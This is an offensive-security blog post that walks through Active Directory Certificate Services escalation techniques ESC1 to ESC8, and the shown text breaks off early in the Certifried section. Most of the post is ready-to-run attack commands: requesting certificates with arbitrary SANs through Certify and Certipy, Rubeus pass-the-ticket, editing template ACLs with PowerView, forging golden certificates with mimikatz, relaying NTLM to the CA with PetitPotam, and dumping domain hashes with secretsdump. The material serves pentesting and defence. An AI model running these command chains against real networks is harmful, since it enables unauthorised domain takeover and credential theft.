---
layout: post
title: Skidaddle Skideldi - I just pwnd your PKI
---
My dear Bagginses and Boffins, Tooks and Brandybucks, Grubbs, Chubbs, Hornblowers, Bolgers, Bracegirdles and Proudfoots - it is time for some new shit.  
We are going to explore the wonderful world of Active Directory Certificate Services, aka ADCS.  
If you want to leave an impression on your next pentest, this one's for you, as Microsoft's PKI implementation is widely used but little understood (well at least in terms of security).  
Same is true if you live on the blue side, as you can proactively mitigate issues an earn some bonus points with your boss, maybe.  
Prepare yourself for a shitload of pictures, memes, usefull as well as meaningless information.  
   
<img src="/images/2022-09-16/pwndpki_meme.png">  

<!--more-->
# Introduction  

If you have not already done so, go and read the fundamental work which this blog relies on: [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf).  
It is the research from the SpecterOps guys [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_) in the field of ADCS abuses and their mitigations.  

If you are just here to pwn stuff, you can directly jump to your desired section:  
[ESC 1](#esc1)  
[ESC 2](#esc2)  
[ESC 3](#esc3)  
[ESC 4](#esc4)  
[ESC 5](#esc5)  
[ESC 6](#esc6)  
[ESC 7](#esc7)  
[ESC 8](#esc8)  
[Certifried](#certifried)  
[ESC 9](#esc9)  
[ESC 10](#esc10)  

## So what is ADCS?  

<img src="/images/2022-09-16/sponge.png">  

The **A**ctive **D**irectory **C**ertificate **S**ervice(s) is one of the 5 main Active Directory services from Microsoft, included (or at least installable) since Windows Server 2008 -> [Microsoft](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd578336(v=ws.10)?redirectedfrom=MSDN). During my pentests, I have not seen one environment, where ADCS was not installed and in use.  
It's Microsoft's [**P**ublic **K**ey **I**nfrastructure](https://en.wikipedia.org/wiki/Public_key_infrastructure) implementation for AD, or if you are as dumb as me, the service that introduces and handles certificates to your Active Directory.  
Certificates can be used to authenticate users and computers, proof validity of a website (you know the little thingy in your browsers searchbar, where it warns you when the cert is invalid) or signing, e.g. a PowerShell script or executable.

During their research, Will and Lee stumbled upon a lot of possible ways to abuse ADCS, and have the Certificate Authority do things like issue certs for other users to us, relay a Domain Controller's authentication to the cert enrollment endpoint, so we could "become" a Domain Controller, and so on. They split the attacks into certain groups, which are: Theft, Persistence, Escalation and Domain Persistence. We will mainly (and maybe only) focus on the escalation ones in this blog post.  

Later on [Oliver Lyak](https://twitter.com/ly4k_) extended the list of vulns (Certifried, ESC9&10) and even wrote according tools to abuse those. Big shoutout to you as well buddy.  

## And how does it work?  

Well, there are some components/terms that we first need to be aware of:  

- **C**ertificate **A**uthortiy: That is the PKI server that generates and issues the certificates
- Enterprise CA: The AD integrated CA, which offers certificate templates
- Certificate Template: Thats like a blueprint for a cert, which defines what a cert is for, what an enrollee needs to supply as info, who is allowed to enroll and so on
- **C**ertificate **S**igning **R**equest: That is the data one sends to the CA in order to get a cert
- **E**xtended **K**ey **U**sage: These are OIDs that define what a cert can be used for, for example signing, authentication etc.
- Certificate: A digitally signed (by the CA) "document" that can be used for the stuff specified within the EKU. It ties an identity to a key pair (public/private), which allows applications to identify them.  
- Subject: The identity the cert is bound to
- PKINIT: A Kerberos extension that enables the usage of certs to request tickets  

To give you an overview of how a cert is issued, have a look at the following pic:  

| <img src="/images/2022-09-16/certissue.png">  | 
|:--:| 
| *from [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)* |



 >A certificate is an X.509-formatted digitally signed document used for encryption, message
signing, and/or authentication. A certificate typically has various fields, including some of the
following:
- Subject - The owner of the certificate.  
- Public Key - Associates the Subject with a private key stored separately.  
- NotBefore and NotAfter dates - Define the duration that the certificate is valid.  
- Serial Number - An identifier for the certificate assigned by the CA.  
- Issuer - Identifies who issued the certificate (commonly a CA).  
- SubjectAlternativeName - Defines one or more alternate names that the Subject may go by.  
- Basic Constraints - Identifies if the certificate is a CA or an end entity, and if there are any constraints when using the certificate.  
- Extended Key Usages (EKUs) - Object identifiers (OIDs) that describe how the certificate will be used. Also known as Enhanced Key Usage in Microsoft parlance. Common EKU OIDs include:  
    - Code Signing (OID 1.3.6.1.5.5.7.3.3) - The certificate is for signing executable code.  
    - Encrypting File System (OID 1.3.6.1.4.1.311.10.3.4) - The certificate is for encrypting file systems.  
    - Secure Email (1.3.6.1.5.5.7.3.4) - The certificate is for encrypting email.  
    - Client Authentication (OID 1.3.6.1.5.5.7.3.2) - The certificate is for authentication to another server (e.g., to AD).  
    - Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2) - The certificate is for use in smart card authentication.    
    - Server Authentication (OID 1.3.6.1.5.5.7.3.1) - The certificate is for identifying servers (e.g., HTTPS certificates).  
- Signature Algorithm - Specifies the algorithm used to sign the certificate.  
- Signature - The signature of the certificates body made using the issuer’s (e.g., a CA’s) private key  

-- <cite>*also from [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)*</cite>  

I will try to walk you and me through all the possible misconfigurations, as well as pwning them.  
So without further ado - let's have some fun. 

# Scenarios
In the following we will dive through all the different escalation scenarios.  

## General recon  

To gather general info about the CAs in the Domain we can use:  

[certutil](https://social.technet.microsoft.com/wiki/contents/articles/3063.certutil-examples-for-managing-active-directory-certificate-services-ad-cs-from-the-command-line.aspx#View_CA_Configuration)  
```
certutil -dump
```  
<img src="/images/2022-09-16/recon_1.png">  

[Certify](https://github.com/GhostPack/Certify)  
```
Certify.exe cas
```  
<img src="/images/2022-09-16/recon_2.png">  

[Certipy](https://github.com/ly4k/Certipy)  
```
Certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -dc-ip '10.55.0.2' -stdout
```  
<img src="/images/2022-09-16/recon_3.png">  

Or we could just open the according mmc snap-ins on the CA itself - GUI style so to say.  

## ESC1
In this scenario we are dealing with a misconfigured certificate template, which allows normal users to enroll. The template allows client authenticataion and the requester can specify a ``subjectAltName (SAN)``. There is also no manager approval -> the request gets auto approved. The ``SAN`` allows the cert to hold one or more additional identities beyond the subject itself, which's main purpose is in the context of webservers. For AD authentication, the SAN normaly holds the UPN of the according identity, which is then mapped to an AD account. If you followed along closely, you probably noticed that if we can control the SAN, we can become whoever we like to.  

<img src="/images/2022-09-16/dameme.png">  

### What it looks like in AD
We have ``Client Authentication`` as purpose:  
<img src="/images/2022-09-16/ESC1_1.png"> 

All domain users can enroll:  
<img src="/images/2022-09-16/ESC1_2.png"> 

Enrolee supplies the subject:  
<img src="/images/2022-09-16/ESC1_3.png"> 

No manager approval:  
<img src="/images/2022-09-16/ESC1_4.png"> 

### Recon
Well, you could probably just open ``certmgr.msc`` and look if any of the templates ask for additional input, and then check if you can supply a SAN.  
However, we can also issue the tools mentioned above to automate this.

#### Native PowerShell  

```
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=mcafeelab,DC=local'
```  

<img src="/images/2022-09-16/ESC1_enum1.png">  

#### Certify 

```
Certify.exe find /enrolleeSuppliesSubject
or
Certify.exe find /vulnerable /currentuser
```  

<img src="/images/2022-09-16/ESC1_enum2.png">  

#### Certipy  

```
certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -dc-ip '10.55.0.2' -stdout -vulnerable
```  

<img src="/images/2022-09-16/ESC1_enum3.png">  

### Exploitation

#### Manually and Rubeus

We can simply abuse this manually the GUI way with the help of ``certmgr.msc``:  
<img src="/images/2022-09-16/ESC1_5.png">  

Specify our CN and as alternative name the UPN of the ``Administrator@mcafeelab.local`` user:  
<img src="/images/2022-09-16/ESC1_certreq.png">  

We now have a cert with ``Administrator`` as the SAN:  
<img src="/images/2022-09-16/ESC1_7.png">

Export the cert as pfx:  
<img src="/images/2022-09-16/ESC1_certexport.png">  

Nicely ask the DC for a TGT with Rubeus and do a pass the ticket attack:  

<img src="/images/2022-09-16/chuck.png">

```
.\Rubeus.exe asktgt /domain:mcafeelab.local /dc:dc2016-2.mcafeelab.local /user:Administrator /certificate:esc1.pfx /password:test /ptt
```
<img src="/images/2022-09-16/ESC1_8.png">

#### Certify  

```
.\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:"ESC1" /altname:"Administrator"
or
.\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:"ESC1" /altname:"Administrator" /install
```  

<img src="/images/2022-09-16/ESC1_exploit1.png">  

The ``/install`` flag will ...  

<img src="/images/2022-09-16/drumroll.png">  

... install the requested cert to our current user's cert store.  
This allows us to export the cert as described in [Manually and Rubeus](#manually-and-rubeus) via the GUI, without the need for some linux / openSSL magic.  

But we can of course go the openSSL route to create the cert:  

```
openssl pkcs12 -in cert -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx 
```

<img src="/images/2022-09-16/ESC1_exploit2.png">  

and then let Rubeus do its magic.   

#### Certipy

Certipy can be leveraged to request a ticket and fetch a TGT and get the pwnd user's NT hash - Thank you Oliver for Certipy <3  

```
certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template 'ESC1' -upn 'Administrator@mcafeelab.local'
certipy auth -pfx 'administrator.pfx' -dc-ip '10.55.0.2' -username 'Administrator' -domain 'mcafeelab.local'
```

We can now do some PTH thingy to pwn the domain:  

```
secretsdump.py -just-dc -hashes 'aad3b435b514...:...f7207931' 'mcafeelab.local/Administrator@dc2016-2.mcafeelab.local' 
```

<img src="/images/2022-09-16/ESC1_exploit3.png">  

## ESC2  
No matter how often I red through all the stuff I found regarding ESC2, I can't wrap my head around it completely.  
It describes the case, where there is either the ``Any purpose`` EKU set, or no EKU at all (which would be called a SubCA cert), which utlimately would allow the cert to be used for anything we like. Also low priv users need enrollment rights and no manager approval is in place.  
It is however not abusable like ESC1, if we can't specifiy the SAN.  
A cert with no EKU could additionally be used to sign other certs. Unfortunately these can't be used for domain auth by default, as the ``NTAuthCertificates``(see p. 14 of the whitepaper) object won't trust them.  
~~So the abuse cases are not clear to me. We might stumble upon a cert in a forgotten folder of some other user, maybe. But we are not able to request them. The thing that comes to my mind is relaying, and that might actually work.~~  
UPDATE:  After releasing the blog, Oliver reached out to me and helped me at quite some topics regarding ADCS. In this case you can abuse ESC2 exactly like [ESC3](#esc3), if the templates you want to target are ``Schema Version 1``, which is true for all the default templates (like ``Doman Controller``, ``Client``, ``Computer`` and so on).   


Will and Lee at least gave us a tip on how to search for them.
```
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0
)(!(pkiextendedkeyusag=*))))'  
```
This did not work in my environment. Shortening the query a bit, at least narrowed down the results:  
```
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(pkiextendedkeyusage=2.5.29.37.0))' -SearchBase 'CN=Configuration,DC=mcafeelab,DC=local' 
```

<img src="/images/2022-09-16/ESC2_enum2.png">  

But you can still just use the before mentioned tools and search for the according attribute:  

<img src="/images/2022-09-16/ESC2_enum1.png">  


## ESC3
Here we are facing a cert template with the ```Certificate Request Agent``` EKU (OID 1.3.6.1.4.1.311.20.2.1). A cert issued from this template enables us to request a cert on behalf of any user, by co-signing a new CSR for a template that allows for ``enroll on behalf of`` (reminds me of the delegation brainfuck :) ).  
For this to work, we obviously need to meet two conditions:  
1. Low priv user enrollment rights, no manager approval, ``Certificate Request Agent`` EKU is defined  
2. Low priv user enrollment rights, no manager approval, issuing requires ``Certificate Request Agent`` cert, template allows for domain auth  

### What it looks like in AD  

<img src="/images/2022-09-16/ESC3_info1.png">  

<img src="/images/2022-09-16/ESC3_info3.png">  

### Recon

Look out for the afore mentioned prerequisits. However Certify and Certipy did not recognize the 2nd prerequisit matching templates as vulnerable. You can find them as follows:  

```
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(msPKI-RA-Application-Policies=1.3.6.1.4.1.311.20.2.1)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2))' -SearchBase 'CN=Configuration,DC=mcafeelab,DC=local'
```  
<img src="/images/2022-09-16/ESC3_enum2.png">  

I opened a [pull request](https://github.com/GhostPack/Certify/pull/22) for Certify. Could also quickly be done for Certipy I guess, but man I have to get this blog post rolling.  
Please be aware that, due to some code changes (not related to my PR, as this also happens without it), the output is mangled up:  

<img src="/images/2022-09-16/esc3_mangled.png">  

#### Certify  

```
 .\Certify.exe find
 ```

 ``/vulnerable`` would give me the first template, the 2nd one however did not pop up, which makes no sense, as it won't be abusable if not both templates are available.  

 <img src="/images/2022-09-16/ESC3_info4.png">  

#### Certipy  

Same situation as with Certify, only the first required template is found and flagged:  

```
certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -dc-ip '10.55.0.2' -stdout -vulnerable 
```
<img src="/images/2022-09-16/ESC3_enum1.png">  

### Exploitation

Well, strange issues here again. If I happened to specify the ``onbehalfof`` parameter in both tools, I would get an error if I used ``mcafeelab.local\Administrator``. Leaving away the ``.local`` part works like a charm:  

<img src="/images/2022-09-16/ESC3_exploit1.png">  

<img src="/images/2022-09-16/ESC3_exploit2.png">  

#### Certify  
```
.\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:"ESC3_1" /install
.\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:ESC3_2 /onbehalfof:mcafeelab\god /enrollcert:ESC3_1.pfx /enrollcertpw:'Pillemann123!'
openssl pkcs12 -in cert -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx  
.\Rubeus.exe asktgt /domain:mcafeelab.local /dc:dc2016-2.mcafeelab.local /user:Administrator /certificate:esc3_2.pfx /password:test /ptt
```
<img src="/images/2022-09-16/ESC3_exploit4.png">  

<img src="/images/2022-09-16/ESC3_exploit3.png">  

#### Certipy  
```
certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template 'ESC3_1'
certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template 'ESC3_2' -on-behalf-of 'mcafeelab\Administrator' -pfx lowpriv.pfx
certipy auth -pfx 'administrator.pfx' -dc-ip '10.55.0.2' -username 'Administrator' -domain 'mcafeelab.local'
secretsdump.py -just-dc -hashes 'aad3b435b514...:...f7207931' 'mcafeelab.local/Administrator@dc2016-2.mcafeelab.local'
```

## ESC4

This one is fun because it happens when someone fucked up with the ACLs on the AD object -> you can alter the template with an unintended user. This might ultimately end up in a situation where we can compromise an otherwise unabusable template.  

<img src="/images/2022-09-16/certs_meme.png">

This is abusable if we have write or full access to a template!   

### What it looks like in AD  

<img src="/images/2022-09-16/ESC4_recon3.png">  

### Recon

#### Certify  

```
 .\Certify.exe find -vulnerable
 ```

 <img src="/images/2022-09-16/ESC4_recon1.png">  

#### Certipy  

```
certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -dc-ip '10.55.0.2' -stdout -vulnerable 
```
<img src="/images/2022-09-16/ESC4_recon2.png"> 

### Exploitation

Well in this case we can't work with Certify ~~or Certipy~~ (see below update) alone, because we need to alter the AD object / cert template. For this reason we are going to use [Will's](https://twitter.com/harmj0y) [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) or [Fortalice Solutions's](https://fortalicesolutions.com/) [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate) respectively.

#### PowerView & Certify
```
# Give users enrollment rights  
Add-DomainObjectAcl -TargetIdentity ESC4 -PrincipalIdentity "Domänen-Benutzer" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=mcafeelab,DC=local" -Verbose  
```
<img src="/images/2022-09-16/ESC4_enrollset.png">  
```
# Disable manager approval
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mcafeelab,DC=local" -Identity ESC4 -XOR @{'mspki-enrollment-flag'=2} -Verbose

# Disable signature required
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mcafeelab,DC=local" -Identity ESC4 -Set @{'mspki-ra-signature'=0} -Verbose

# Enable enrollee supplies subject
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mcafeelab,DC=local" -Identity ESC4 -XOR @{'mspki-certificate-name-flag'=1} -Verbose

# Set application policy extension to client authentication
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mcafeelab,DC=local" -Identity ESC4 -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose

```
<img src="/images/2022-09-16/ESC4_exploit1.png">  

Before and after altering the cert template:  
<img src="/images/2022-09-16/ESC4_beforeafter.png">  

```
# PWN
.\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:"ESC4" /altname:"Administrator" /install

# Export the cert

.\Rubeus.exe asktgt /domain:mcafeelab.local /dc:dc2016-2.mcafeelab.local /user:Administrator /certificate:esc4.pfx /password:test /ptt
```


#### Certipy  
```
certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template 'ESC4' -upn 'Administrator@mcafeelab.local'
certipy auth -pfx 'administrator.pfx' -dc-ip '10.55.0.2' -username 'Administrator' -domain 'mcafeelab.local'
secretsdump.py -just-dc -hashes 'aad3b435b514...:...f7207931' 'mcafeelab.local/Administrator@dc2016-2.mcafeelab.local'  
```

UPDATE: Well, again I was wrong, and Oliver added a standalone approach:  
```
certipy template -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -template 'ESC4_1'
```

<img src="/images/2022-09-16/esc4_exploit99.png">  

This will make the template vulnerable to [ESC1](#esc1)  
Before and after Certipy pwnage:  

<img src="/images/2022-09-16/esc4_exploit100.png">   

If you are on an engeagement, you might want to use the ``-safe-old`` switch to save the before-version and preserve teh ability to roll back the settings, once you have abused the template.  
More on this on Oliver`s [blog](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6).  

## ESC5

This case describes all other possible scenarios around ACLs. Which might include:  

- Pwning the CA server itself to tamper around with templates and stuff, through maybe RBCD attack or a direct way like local admin    
- ACLs wrongly set somewhere up the line in AD - maybe where some set descendant rights somewhere in the config tree  
- The CA server’s RPC/DCOM server  
- ...  

<img src="/images/2022-09-16/esc5_1.png"> 

~~There is no direct abuse path, but you can use the before mentioned stuff as a guideline on how to proceed if this stuff here happens.~~  
UPDATE: Shortly after my release I stumbled upon [n00py's](https://twitter.com/n00py1) tweet about ways to abuse a pwnd PKI server: [https://twitter.com/n00py1/status/1574423470640873472](https://twitter.com/n00py1/status/1574423470640873472).  
The answer to success was the golden cert attack, which is described here: [https://pentestlab.blog/2021/11/15/golden-certificate/](https://pentestlab.blog/2021/11/15/golden-certificate/).  
So if we pwn a PKI server (local admin is sufficient) we can forge a cert for everyone we like - even offline, like it is done with the golden ticket attack for Kerberos.  

### Exploitation  

#### GUI style with mimikatz  

We can use Mimikatz to forge certs directly on the CA server for any user for us if we are local admin:  

```
crypto::scauth /caname:mcafeelab-DC2016-2-CA-1 /upn:Administrator@mcafeelab.local
```  

<img src="/images/2022-09-16/esc5_exploit.png">  

Afterwards we can export the cert and use it to authenticate like described in e.g. [ESC1](#esc1).  

We can alternatively export the CAs cert and key manually.  
RDP to the server as admin, open ``certsrv.msc`` and trigger the ``Backup up CA`` function:  

<img src="/images/2022-09-16/esc5_exploit1.png">  

Select to export the private key and CA cert, to fetch the according ``p12`` file:  

<img src="/images/2022-09-16/esc5_exploit2.png">  

You can now use tools like [ForgeCert](https://github.com/GhostPack/ForgeCert) or Certipy to go on.

#### Certipy

As for mostly all cases, Oliver automated the abuse capability in Certipy. If you owned a user which is admin on the CA just do:  

Backup the CA cert  
```
certipy ca -backup -u 'localadmin' -p 'test' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1'
```  

Forge a cert to whom we want to:  
```
certipy forge -ca-pfx mcafeelab-DC2016-2-CA-1.pfx -upn god@mcafeelab.local -subject 'CN=god,CN=Users,DC=mcafeelab,DC=local'
```

And authenticate as that user:  
```
certipy auth -pfx 'god_forged.pfx' -dc-ip '10.55.0.2'
```

<img src="/images/2022-09-16/esc5_exploit3.png"> 

## ESC6  

Here we are talking about a CA specific setting which is the ``EDITF_ATTRIBUTESUBJECTALTNAME2`` flag.  
This setting allows us, even when the template is set to build the subject name from the AD object, to specify a Subject Alternative Name.  
This also means, that EVERY template for authentication is pwnable, when this flag is set.  
This was fixed by Microsoft in the patch for CVE-2022–26923 (may still be worth looking for).  
  
### Recon  

#### Certutil  

```
certutil -config "DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1" -getreg policy\EditFlags
```  
<img src="/images/2022-09-16/esc6_recon1.png">       

#### Certify  

```
.\Certify.exe find
```  
<img src="/images/2022-09-16/esc6_recon2.png">   

#### Certipy  

```
certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -dc-ip '10.55.0.2' -stdout -vulnerable
```  
<img src="/images/2022-09-16/esc6_recon3.png">   

### Exploitation  

#### Certify  

```
.\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:"user" /altname:"god" /install
.\Rubeus.exe asktgt /domain:mcafeelab.local /dc:dc2016-2.mcafeelab.local /user:god /certificate:god.pfx /password:test /ptt
```  

#### Certipy  

```
certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template 'user' -upn 'ds@mcafeelab.local'
certipy auth -pfx 'ds.pfx' -dc-ip '10.55.0.2' -username 'ds' -domain 'mcafeelab.local'
```  

## ESC7  

Here again we are talking about ACLs, this time on the CA itself. We can grant the rights to manage the CA as well as the ones to issue and manage certs:  

<img src="/images/2022-09-16/ESC7_1.png">  

Equipped with these rights, we can either directly alter the CA's config, or approve pending requests.  
If we want to abuse all this shit on a Windows box, we need the [PSPKI](https://www.powershellgallery.com/packages/PSPKI/3.7.2) PowerShell modules.  

```
# If you run into problems to install it, enable TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Install-Module -Name PSPKI
Import-Module PSPKI
```

### Recon  

If we happen to have direct access to a CA, we can check just the settings from the introduction of this chapter.  

#### PSPKI

```
Get-CertificationAuthority -ComputerName dc2016-2.mcafeelab.local | Get-CertificationAuthorityAcl | select -ExpandProperty access
```  
<img src="/images/2022-09-16/ESC7_recon1.png">  


### Exploitation  

If a user has the ``Manage CA`` rights, he can remotely edit the ``EDITF_ATTRIBUTESUBJECTALTNAME2`` - aka [ESC6](#esc6) - to be able to specify a SAN for **ALL** authentication templates afterwards.  

#### PSPKI  

```
# Get the current value of ``EDITF_ATTRIBUTESUBJECTALTNAME2``, modify it and check again
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "dc2016-2.mcafeelab.local"
$configReader.SetRootNode($true)
$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")

# Verify with certutil
certutil.exe -config "CA.domain.local\CA" -getreg "policy\EditFlags"
```

<img src="/images/2022-09-16/esc7_exploit1.png"> 

You can now stick to [ESC6](#esc6).  

#### Certipy  

Certipy can be used in this scenario to give a user the ``Issue and Manage Certificates`` right.  

```
certipy ca -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -add-officer 'ds'
```  

<img src="/images/2022-09-16/esc7_exploit2.png">  

<img src="/images/2022-09-16/esc7_exploit3.png">  

If a user has the ``Issue and Manage Certificates`` rights, he is able to approve pending requests, which allows us to "bypass" the manager approval function.  

#### Certify

- Request a certificate that requires manager approval  

```
.\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:"ESC7" /altname:"god" /install
```  

<img src="/images/2022-09-16/esc7_exploit4.png"> 

The request is pending, and we got an ID.  

- Approve the pending request with PSPKI   

```
Get-CertificationAuthority -ComputerName dc2016-2.mcafeelab.local | Get-PendingRequest -RequestID 731 | Approve-CertificateRequest
```  

<img src="/images/2022-09-16/esc7_exploit5.png">  

- Fetch the now approved cert  

```
.\Certify.exe download /ca:DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1 /id:731
```

<img src="/images/2022-09-16/esc7_exploit6.png">  

- Copy togehter your RSA private key and the cert, and generate your pfx and pwn the world.  

#### Certipy  

- If not already availabe, enable the SubCA template (remember, this is the all purpose template). It should however be enabled by default.  

```
certipy ca -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -enable-template SubCA
```

<img src="/images/2022-09-16/esc7_exploit7.png">  

- Try to request a cert based on the SubCA template which will obviously fail. Save the private key  

```
certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template subCA -upn administrator@mcafeelab.local
```

- Approve the request with our superpowers  

```
certipy ca -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -issue-request 732
```

- Fetch the issued cert  

```
certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -retrieve 732
``` 

<img src="/images/2022-09-16/esc7_exploit8.png">  

<img src="/images/2022-09-16/tada_meme.png"> 


## ESC8

Yeah, this was the one that initially got the most attention, and found it's implementation in several tools that automated exploitation like impacket.  
It describes the fact that we can relay an authentication to the (default enabled and to be found at http://caserver/certsrv/) HTTP enrollment endpoint, and grab certs for the relayed identities in order to impersonate them.  
Suddenly coercion was a big thing again, and with the rise of PetitPotam and Co. things got really ugly.  

### Recon

#### Certify  

```
.\Certify.exe cas
```

<img src="/images/2022-09-16/esc8_recon1.png"> 

#### Certutil

```
certutil.exe -enrollmentserverurl -config "dc2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1"
```

#### PSPKI 

```
Get-CertificationAuthority | select name,enroll* | fl
```

### Exploitation

Coerce authentication (Dementor, Printerbug, Petitpotam, DFSCoerce, Coercer, ...) or just wait. Relay with [ntlmrelayx](https://github.com/SecureAuthCorp/impacket).  

**Whatever you read, if you want to pwn a DC -> specify the template ``Domain Controller`` Otherwise it wouldn't work for me. Impacket uses the ``Machine`` template by default, and this can't be used by a DC for authentication.**  

<img src="/images/2022-09-16/onedoes_meme.png"> 

```
./ntlmrelayx.py -t "http://DC2016-2.mcafeelab.local/certsrv/certfnsh.asp" --adcs -smb2support --template "Domain Controller"
python PetitPotam.py -u lowpriv -p low -d mcafeelab.local 10.55.0.30 10.55.0.1
.\Rubeus.exe asktgt /user:dc2016$ /ptt /certificate:MIIRnQIBAzCCEWcGCSq<snip>
```

<img src="/images/2022-09-16/esc8_exploit1.png">  

<img src="/images/2022-09-16/esc8_exploit2.png">  

<img src="/images/2022-09-16/esc8_exploit3.png"> 

If you are lazy, you can try to use [Batsec's](https://twitter.com/_batsec_) [ADCSPwn](https://github.com/bats3c/ADCSPwn), which automates the whole thing.  
<br>  
<br>
Now to the brainfuck part. I hoped that after the S4U stuff, I would have a nice and relaxing time, but I was wrong. 
I will try to keep this as simple as possible, because I don't get it either. You can try to follow me along for Certifried, ESC9 and ESC10.  

<img src="/images/2022-09-16/understand_meme.png">    

## Certifried

[Oliver](https://twitter.com/ly4k_) found another vulnerability in ADCS, which is widely known as [Certifried](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4). I higly recommend you to read his blog post, as it fully and understandable describes what exactly is happening.   

The vulnerability allowed a low priv user to privesc to domain admin in a default setup, and was patched by Microsoft with updates for CVE-2022–26923 in May 2022. You know that some admins hate patching, don't you?  

By default, users can enroll in the ``User`` template, and computers in the ``Machine`` template, both allowing for client authentication.  
The difference is, that the user certs are derived from the ``UPN``, which a computer object does not have. Instead their certs will be derived from their ``dNSHostName`` property.  
Now the tricky part:  
When a user wants to authenticate via PKINIT, the KDC will lookup the UPN provided in the cert, and try to match it to a user. The UPN must be unique, so we can't simply change the UPN of user A to the B@domain.com, if B already exists.
When creating a computer account, the creator gets granted the ``Validated write to DNS host name`` permissions, which allows him to alter the ``dNSHostName`` property of the object, which needs to be ["compliant with the computer name and domain name"](https://learn.microsoft.com/en-us/windows/win32/adschema/r-validated-dns-host-name). This allows us to set the DNS name to something that doesn't already exist, like test.mcafeelab.local. 

